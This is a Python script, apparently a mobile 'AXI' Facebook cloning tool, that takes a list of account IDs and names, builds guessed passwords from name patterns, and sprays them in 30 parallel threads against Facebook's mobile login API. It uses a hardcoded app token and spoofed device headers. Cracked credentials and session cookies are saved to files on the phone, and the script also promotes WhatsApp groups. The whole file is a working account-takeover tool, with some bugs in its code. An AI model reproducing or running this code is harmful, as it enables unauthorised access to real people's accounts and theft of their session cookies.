import os
try:
    import requests
except ModuleNotFoundError:
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
import random,time,sys,requests,uuid,json,base64,re,zlib,shutil,platform,subprocess,tempfile,string
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup

oks = []
cps = []
plist = []
methods = []
speed = []
twf = []
loop = 0
pcp = []
cok = []
os.system('https://chat.whatsapp.com/GmuQAx0eBTfGMjLF7gyeNH')

logo = """
\033[1;32m         ###    ##     ## #### 
\033[1;37m        ## ##    ##   ##   ##  
 \033[1;37m      ##   ##    ## ##    ##  
\033[1;32m      ##     ##    ###     ##  
\033[1;37m      #########   ## ##    ##  
\033[1;37m      ##     ##  ##   ##   ##  
\033[1;32m      ##     ## ##     ## ####  V.32 update 
\033[1;37m----------------------------------------------
  [+] Owner    :   HAMAD-FALEX
  [+] Github   :   AXI-403
  [+] Status   :   PRIVATE 
\033[1;37m----------------------------------------------"""
def linex():
    print('\033[1;37m----------------------------------------------')

def clear():
        os.system('clear')
        print(logo)

def menu():
    os.system('clear')
    print(logo)
    print('\033[1;37m[1] File Cloning')
    print('\033[1;37m[2] Random Cloning')
    print('\033[1;37m[3] Gmail Cloning')
    print('\033[1;31m[4] Join Whatsapp Group')
    linex()
    lomda = input('\033[1;32mChoose Option : ')
    if lomda in ['1']:
        clear()
        print('\033[1;32m EXAMPLE :  /sdcard/filename.txt')
        linex()
        file = input('Enter File Name\033[1;32m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print('FILE NOT FOUND ')
            time.sleep(2)
            menu()
        clear()
        print(' [1] METHOD [2] METHOD')
        linex()
        mthd=input(' Choice : ')
        linex()
        clear()
        plist = []
        try:
            ps_limit = int(input('\033[1;32m [•] How Many Pasword You Want To Add ? '))
        except:
            ps_limit =1
        linex()
        clear()
        print('\033[1;32m EXAMPLE : first last,firtslast')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'\033[1;32m({i+1}) Password : '))
        linex()
        clear()
        print(' Do you want to show cp in terminal (yes/no)')
        linex()
        cx=input(f" Selection : ")
        if cx in ['y','Y','yes','Yes','1']:
        	pcp.append('y')
        else:
        	pcp.append('n')
        linex()
        print(' Do you want to Show OK ID Cookie (yes/no)')
        linex()
        xx = input(' Selection : ')
        if xx in ['y','Y','yes','Yes']:
        	cok.append('y')
        else:
        	cok.append('no')
        with loda(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print (f' Don''t minimize termux during cloning')
            linex()
            print(' Turn on and off flight mode if not working.')
            linex()
            print('\033[1;37m Total Accounts To Crack : \033[1;32m'+total_ids+f'\033[1;37m ')
            print(' Cracking has been Started')
            print(" To Stop Process CTRL+c")
            linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb,ids,names,passlist)
                elif mthd in ['2','02']:
                    crack_submit.submit(ffb2,ids,names,passlist)
                elif mthd in ['3','03']:
                    pass
        print('\033[1;37m')
        linex()
        print('[•] The process has completed')
        linex()
        print('[•] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input('Press enter to back ')
        os.system('python axi.py')
    elif lomda in ['2']:
            os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')
    else:
        menu()

def ffb(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;32m[\033[1;37mAXI-M1\033[1;32m] \033[1;37mCount\033[1;37m/\033[1;31m%s\033[1;37m (\033[1;32mOK\033[1;37m|\033[1;32m%s\033[1;37m)'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/375.1.0.28.111;FBBV/315015375;FBDM/{density=3.0,width=720,height=1440};FBLC/en_US;FBCR/airtel;FBMF/Realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/Realme XT;FBSV/5;nullFBCA/arm64-v8a:;]"
                        head = {'User-Agent': ua,
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[Successful-AXI] '+ids+'|'+pas+'\033[1;97m')
                                        if 'y' in cok:
                                        	print(' Cookie : '+coki+'')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                 
                                        open('/sdcard/axi_ok.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/axi_ok_coki.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r\033[1;35m[TWO-Factor-AXI] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                        	if 'y' in pcp:                        	
                                                print('\r\r\x1b[1;36m[CheckPoint-AXI] '+ids+'|'+pas+'\033[1;97m')
                                                open('/sdcard/AXI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)

def ffb2(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;32m[\033[1;37mAXI-M2\033[1;32m] \033[1;37mCount\033[1;37m/\033[1;31m%s\033[1;37m (\033[1;32mOK\033[1;37m|\033[1;32m%s\033[1;37m)'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/50.0.0.8849;FBBV/6289562;[FBAN/FB4A;FBAV/26.0.0.12.57;FBBV/135472877;FBDM/{density=3.0,width=720,height=1280};FBLC/ar_BH;FBRV/577974193;FB_FW/2;FBCR/T-Mobile US;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/arm64-v8a:armeabi:;]"
                        head = {'User-Agent': ua,
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[Successful-AXI] '+ids+'|'+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                      
                                        open('/sdcard/axi_ok.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/axi_ok_coki.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r\033[1;35m[Two-Factor-AXI] '+ids+'|'+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;36m[CheckPoint-AXI] '+ids+'|'+pas+'\033[1;97m')
                                                open('/sdcard/AXI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
menu()